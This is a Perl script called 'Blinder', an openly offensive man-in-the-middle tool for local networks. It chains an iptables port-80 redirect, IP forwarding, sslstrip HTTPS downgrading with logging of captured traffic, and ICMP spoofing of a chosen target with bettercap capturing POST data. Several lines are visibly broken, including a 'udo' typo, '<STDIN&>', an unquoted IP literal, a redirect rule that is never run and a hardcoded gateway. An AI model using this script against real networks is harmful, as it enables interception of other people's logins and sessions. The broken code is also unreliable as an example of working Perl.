#! /usr/bin/perl -w

#########################################################################
# Blinder
# Blind Traffic Hijacker and Decoder
# Dependecy: Bettercap
# Automatic Intelligent Attack
# Do not change the variables until you know, what your doing!
#########################################################################

use strict;
use warnings;

# open /etc/etter.conf and uncomment
# iptables redirect on/off
# ctrl+o to save changes
# ctrl+x to exit nano and continue with script
system("clear");

print "[ ! ] Setting up environment [ ! ]\n";
my $tables;
print "[ + ] You will have to uncomment iptables redirect.\n";
print "[ + ] Inside nano use ctrl+o to save your changes ctrl+x to exit and continue the script.\n";
print "[ + ] Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n)\n";
$tables=<STDIN>;
chomp($tables);
    if ($tables eq "y"){
        print "press ctrl+x to exit nano";
        system ("sudo nano /etc/etter.conf");
    }

# change iptables to allow redirection from port 80 to port 8080
my $redirect;
print "[ + ] Changing iptables to redirect traffic from port 80 to port 8080\n";
$redirect='sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080';

# check to make sure ip forwarding is enabled
my $forward;
print "[ + ] Checking to make sure ip forwarding is enabled\n";
system ("cat /proc/sys/net/ipv4/ip_forward");
print "[ + ] Does ip forward = 0? (y/n)\n";
$forward=<STDIN>;
chomp($forward);
    if ($forward eq "y"){
        system ("sudo nano /proc/sys/net/ipv4/ip_forward");
        system ("cat /proc/sys/net/ipv4/ip_forward");
}

# check to find out what the default gateway is
my $default;
system ("netstat -nr");
    print "[ + ] What is the default gateway?\n";
    $default=<STDIN>;
    chomp($default);

# check which network interface device
my $interface;
system ("ifconfig");
    print "[ + ] Which network interface would you like to use?\n";
    $interface=<STDIN>;
    chomp($interface);

# check what your ip address is
my $ip;
system ("ifconfig $interface");
    print "[ + ] What is your IP address?\n";
    $ip=<STDIN>;
    chomp($ip);


# start ssl strip
my $ssl;
my $log;
print "########################################\n";
print "[ + ] Starting SSL Strip.\n";
print "[ + ] We have a few options for our parameters with SSL Strip.\n";
print "[ + ] Here are you options: \nsniff all traffic, kill active sessions, log data (akl) \nkill, log, and sniff only https traffic (kl) \nlog https traffic only(l)\n";
    $ssl=<STDIN>;
    chomp($ssl);
print "Enter name of the log file, it has to end with '.log'? (ex: strip.log )\n";
    $log=<STDIN>;
    chomp($log);
        if ($ssl eq "akl"){
            system ("sudo sslstrip -a -k -l 8080 -w $log ");
        }
        if ($ssl eq "kl"){
            system ("sudo sslstrip -k -l 8080 -w $log ");
        }
        elsif ($ssl eq "l"){
            system ("udo sslstrip -l 8080 -w $log ");
        }

# start following the sslstrip log using tail
my $tail;
print "########################################\n";
print "[ + ] Do you want to start to follow the log file in real time? (y/n)\n";
    $tail=<STDIN&>;
    chomp($tail);    
    if ($tail eq "y"){
        print "[ + ] Starting to tail the sslstrip log file.\n";
        system ("sudo tail -f $log");
    }
    else {
        print "[ + ] Script done. Time to wait.\n";
    }

# start blind traffic hijacker
my $blindarp;
my $target;
my $gateway;
my $localhost;
$localhost=127.0.0.1;
print "[ + ] Enter Gateway? (y/n)\n";
    $gateway=<STDIN>;
    chomp($gateway);
print "[ + ] Do you want to spoof a specific target? (y/n)\n";
    $blindarp=<STDIN>;
    chomp($blindarp);
        if ($blindarp eq "y"){
            print "[ + ] Enter the IP of the Target: \n";
            $target=<STDIN>;
            chomp($target);
                system ("sudo python ICMPAttack.py -v -i $interface -g 192.168.15.0 -t $target && bettercap -t $localhost --proxy -P POST");
        }
        else {}